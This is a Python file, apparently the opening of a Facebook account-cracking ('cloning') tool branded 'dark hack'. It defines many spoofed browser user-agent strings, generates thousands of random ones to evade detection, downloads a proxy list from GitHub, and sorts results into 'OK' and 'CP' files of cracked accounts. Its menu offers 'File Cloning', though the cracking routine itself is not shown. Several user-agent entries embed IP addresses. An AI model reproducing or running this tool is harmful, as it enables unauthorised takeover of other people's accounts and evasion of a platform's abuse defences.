ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.41 Trailer/99.3.5162.63",]
ua = ["Mozilla/5.0 (Linux; Android 13; CPH2211 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 [ip:46.123.253.114",]
ua = ["Mozilla/5.0 (Linux; Android 13; RMX3521 Build/RKQ1.211119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; WAS-LX1A Build/HUAWEIWAS-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 GNews Android/2022118446",]
ua = ["Mozilla/5.0 (Linux; Android 12; 6127I Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/399.0.0.24.93",]
ua = ["TuneIn Radio/24.7.0; iPad12,2; iPadOS/16.3.1",]
ua = ["TuneIn Radio/25.1.0; iPhone14,6; iOS/16.3",]
ua = ["Mozilla/5.0 (Linux; Android 9; Redmi 7 Build/PKQ1.181021.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-A107M Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 7.1.1; LG-M700 Build/NMF26X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/402.1.0.24.84",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A217F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; motorola one macro Build/QMDS30.47-33-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LVG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36 [ip:176.201.122.178",]
ua = ["Mozilla/5.0 (Linux; Android 11; M2101K7BNY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A705FN Build/RP1A.200720.012) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 GNews Android/2022120648",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A202F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.1.0.28.72",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 [ip:2.37.165.126",]
ua = ["Mozilla/5.0 (Linux; Android 10; Like_Hi10_2021 Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/120.0.6099.199 Safari/537.36 [ip:66.249.64.3",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-X110 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.230 Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;",]
ua = ["Mozilla/5.0 (Linux; Android 12; REVVL V+ 5G Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.62 [ip:101.56.8.93",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 [ip:87.18.55.100",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-A5260 Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36 Line/14.0.2/IAB",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1.1 Mobile/15E148 Safari/604.1 [ip:78.211.214.225",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A525M Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 [ip:109.54.118.174",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto e20 Build/RONS31.267-94-14; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.211 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 [ip:151.42.171.251",]
ua = ["Mozilla/5.0 (Linux; Android 14; SM-A536B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;",]
ua = ["Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36 [ip:93.55.20.195",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; Moto G (5) Build/OPP28.85-19-4-2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.207 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/446.0.0.27.352;",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; 2311DRN14I Build/TP1A.220624.014)",]
ua = ["Mozilla/5.0 (Linux; Android 12; moto e22 Build/SOV32.121-56; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;",]
ua = ["radio2/187 CFNetwork/1492.0.1 Darwin/23.3.0",]
ua = ["Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG-SM-G870A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1 [ip:88.239.17.63",]
ua = ["Mozilla/5.0 (Linux; Android 13; moto e13 Build/TLAS33.105-257-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 16_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20G81 [FBAN/FBIOS;FBAV/446.0.0.32.330;FBBV/554572428;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/16.6.1;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5;FBRV/558132887",]
ua = ["ExoPlayerDemo/1.2.227-lite (Linux;Android 12) ExoPlayerLib/2.8.2",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 8.1; JC01 Build/PPR1.180610.011)",]
ua = ["TuneIn Radio/27.1.0; iPhone10,2; iOS/16.1.1",]
ua = ["radio.pt 5.7.4 (iPhone; iPhone OS 17.2.1; pt_BR)",]
ua = ["Mozilla/5.0 (Linux; Android 11; motorola one fusion+ Build/RPIS31.Q2-42-25-3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.234 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/447.0.0.24.113;",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/121.0.6167.66 Mobile/15E148 Safari/604.1",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-A047F Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.210 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21C66 [FBAN/FBIOS;FBAV/446.0.0.32.330;FBBV/554572428;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/17.2.1;FBSS/3;FBID/phone;FBLC/nl_NL;FBOP/5;FBRV/557779329",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 14; CPH2411 Build/UKQ1.230924.001)",]
ua = ["Mozilla/5.0 (Linux; Android 10; LGL322DL Build/QKQ1.200308.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 10.0; F808 Build/LRX21M)",]
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 17_2_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1 [ip:104.28.85.111",]
ua = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0 AtContent/94.5.4324.25",]
ua = ["Mozilla/5.0 (Linux; Android 12; NAM-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ['Dalvik/2.1.0 (Linux; U; Android 10; TORNADO Android TV Build/QTG3.200617.002)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 13; G93 Build/TP1A.220624.014)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 11; X88pro10.r.00.6330.d4 Build/RP1A.201105.002)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 14; SO-52C Build/65.2.B.2.112)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 13; REA-AN00 Build/HONORREA-AN00) SP-engine/2.92.0 baiduboxapp/13.54.0.10 (Baidu; P1 13) dumedia/7.48.0.37',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 13.1; Q96 Build/NRD91N)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 14; XQ-CC72 Build/65.2.A.2.137)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 10; HD801 4K Build/QP1A.191105.004)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 12; onn. 4K Streaming Box Build/SGZ2.230609.049.A1)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 12; Chromecast HD Build/STTL.240206.002)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 9; KFONWI Build/PS7329.3851N)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 12; Studio Mini 2023 Build/SP1A.210812.016) AppleWebKit [PB/172] (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 11; R4 Build/RTT7.231021.001)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 5.1; Blade A465 Build/LMY47D)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 14; REA-AN00 Build/HONORREA-AN00)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 11; tc8000_ay30a2 Build/RQ3A.210705.001)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 12; S6003L Build/SP1A.210812.016)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 9; AFTEU014 Build/PS7652.3558N)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 13; HK1 RBOX K8S Build/TQ3C.230805.001.B2)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 14; SCG24 Build/UP1A.231005.007)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 10; HN55BYRA Build/BYR-350)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 9; K1MAX Build/PQ2A.190205.003)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 7.1.2; DS6 Build/N2G47H.1279)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 11; 4K SMART TV Build/RTM6.230109.231)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 5.1; X-TIGI_V1 Build/LMY47D)',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 9; M401A Build/PPR1.180610.011)',]
ua = ["Dalvik/2.1.0 (Linux; U; Android 8.0.0; 7S77_P70 Build/OPR5.170623.014)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9; AFTANNA0 Build/PS7659.4632N)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 7.1.2; X99.02.3.01.d32 Build/NHG47K)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 14; Pixel 7a Build/AP1A.240405.002)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 10; sdk_google_atv_x86 Build/QTU1.200805.001)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 11; GTX-98Q Build/RQ2A.210505.003)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; moto g stylus 5G (2022) Build/T2SDS33.75-38-3-3-5)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-287)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 14; 22122RK93C Build/UP1A.231005.007)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; moto g stylus (2023) Build/T1THS33.75-12-6-5-7)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; HEY2-W19 Build/HONORHEY2-W19) SP-engine/2.92.0 baiduboxapp/13.54.0.10 (Baidu; P1 13) dumedia/7.48.0.37",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Pro Build/AP21.240305.005)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 12; NCO-AL00 Build/HUAWEINCO-AL00)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 11; jacuzzi Build/R122-15753.55.0)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 12; Lamtech Build/SP1A.210812.015)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; S41 Max Build/TP1A.220624.014)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 11; SHARK PRS-A0 Build/PROS2201111CN00MR1)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 11; AI PONT Build/RTM3.211215.117)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9; M8S_PRO Build/PI)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 11; itel AndroidTV Build/RTK2.230523.018)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 10; X96QPRO_TM Build/QP1A.191105.004)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9; SM-G965N Build/PQ3B.190801.04011457)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 7.1.2; TXCZ_B001 Build/NHG47K)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9; UNT413A5_GD2 Build/PPR1.180610.011)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; Android Automotive SDK for arm64 Build/TAG1.230812.001.B6)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9; NEXON X1 Build/PPR1.180610.011)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9; S905x3 Build/PPR1.180610.011)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9; E900V22C Build/PPR1.180610.011)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9ro.build.version.security_patch=2018-08-05; UNT413A5_GD Build/PPR1.180610.011)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 12; V2221 Build/SP1A.210812.003_MOD2)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 11; Toshiba_TV Build/RP1A.200720.011)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 5.0.2; LG-AK495 Build/LRX22G)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 12; moto g51 5G Build/S2RYAS32.58-13-12-5-3-3)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 11; 4K SMART TV Build/RTM6.230109.088)",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 12; SM-A217F Build/SP1A.210812.016) [FBAN/AudienceNetworkForAndroid;FBSN/Android;FBSV/12;FBAB/com.miniclip.carrom;FBAV/15.2.0;FBBV/931;FBVS/6.16.0;FBLC/en_GB",]
ua='RMX3191 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome'
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; Infinix X606B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-181-5) [FBAN/Orca-Android;FBAV/424.0.0.25.113;FBPN/com.facebook.orca;FBLC/en_US;FBBV/510343531;FBCR/Verizon ;FBMF/motorola;FBBD/motorola;FBDV/moto g play - 2023;FBSV/12;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1439};FB_FW/1",]
ua = ["Mozilla/5.0 (Linux; Android 11; Mi 10 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Mobile Safari/537.36",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 13; M2103K19G Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/416.0.0.9.76;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/491071575;FBCR/JAZZTEL;FBMF/Xiaomi;FBBD/Redmi;FBDV/M2103K19G;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=3.375,width=1080,height=2138};FB_FW/1;] FBBK/1",]
ua = ["Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Mobile Safari/537.36",]
ua = ["Dalvik/2.1.0 (Linux; Android 10; POCOPHONE F1) [FBAN/MobileAdsManagerAndroid;FBAV/324.0.0.28.115;FBBV/464692125;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/en_US;FBMF/POCOPHONE;FBBF/Poco;FBDV/Poco F1;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1424};FB_FW/1;]",]
ua = ["Mozilla/5.0 (Linux; Android 13; Redmi Note 8T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36",]
ua = ["Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 7 MIUI/V10.3.6.0.PFGEUXM) [FBAN/Orca-Android;FBAV/241.0.0.17.116;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/182747450;FBCR/MASMOVIL;FBMF/Xiaomi;FBBD/xiaomi;FBDV/Redmi Note 7;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.75,width=1080,height=2130};FB_FW/1;] FBBK/1",]
ua = ["Mozilla/5.0 (Linux; Android 13; CPH2357) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.167 Mobile Safari/537.36",]
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://github.com/Pro-Max-420/Api/blob/main/prox.txt').text
	open('.prox.txt','w').write(prox)
	
except Exception as e:
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mHASAN')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Symbian/3; Series60/'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Nokia'
	e=random.randrange(100, 9999)
	f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/535.1'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (iPhone; CPU iPhone OS 12_4 like Mac OS X)'
	b=random.choice(['6','7','8','9','10','11','12'])
	c=' en-us; GT-'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/605.1.15 (KHTML, like Gecko) Chrome/'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile/15E148 Safari/605.1'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
for x in range(9999):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile/18G82 [FBAN/FBIOS;FBAV/333.0.0.30.109;FBBV/313309308;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/14.7.1;FBSS/3;FBID/phone;FBLC/pt_BR;FBOP/5;FBRV/315505842]'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'



def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Pro-Max-420/ua/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]

def back():
	login()
HASAN="HASAN"
imt="SETU"
ak="CLASS3-"

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])


pwpluss,pwnya=[],[]
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'

def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def HASANj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
def clear():
	os.system('clear')
def back():
	login()
	
	import getpass

attemps = 0


os.system('clear')
#------------------[ MAIN ]-----------------#

os.system('espeak -a 300 " Your,   Real,  Name, sir"')
NameX =input('\033[1;97m[\033[1;92m•\033[1;97m]\033[1;92m WHAT IS YOUR NAME \033[1;91m:\33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  dark, hack,  Tools"')
os.system('xdg-open https://www.youtube.com/@dark64hack')
def banner():
	os.system("clear")
	print (f"""
\033[1;95m【•】⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤
\033[1;92m______           _      _                _    
[38;5;46m|  _  \         | |    | |              | |   
\033[1;93m| | | |__ _ _ __| | __ | |__   __ _  ___| | __
[34;1m| | | / _` | '__| |/ / | '_ \ / _` |/ __| |/ /
\033[1;93m| |/ / (_| | |  |   <  | | | | (_| | (__|   < 
[38;5;196m|___/ \__,_|_|  |_|\_\ |_| |_|\__,_|\___|_|\_\                                                                                         
[38;5;46m【•】⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃⁃➤ 
═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═
\033[1;95m[+]owner: MD Nayeem
[34;1m[+]YouTube:dark hack
[38;5;46m[+]Facebook name: nayeem home 
[38;5;196m[+]messenger group:dark hack
═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═━═""")
def login():
	banner()
	HASANj('\033[1;96m[1] File Cloning\n\x1b[1;92m[2] Facebook ID Admin\n\033[0;97m[0] \033[0;91mEXIT ')
	HASANj('\033[0;97m===============================================')
	HASAN= input('\x1b[1;92m[+] CHOOSE: ');time.sleep(0.01)
	if HASAN in ['m']:
		public()
	elif HASAN in ['1']:
		crack_file()
	elif HASAN in ['i','0i']:
		result()
	elif HASAN in ['2','02']:
		os.system('xdz-opne https://www.facebook.com/profile.php?id=61552015520997')
	elif HASAN in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('#DONE LOGOUT ')
		exit()
	else:
		print('# SELECT CORRECTLY ')
		back()
def error():
	print(f'{k}#TRY AGAIN {u}')
	time.sleep(4)
	back()
	
def result():
	os.system('clear')
	banner()
	print(' 1. CP ACCOUNT ')
	print(' 2. OK ACCOUNT')
	print(' 0. EXIT	')
	kz = input('\n Choose : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print(' File Not Found')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('You Have No CP Results ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
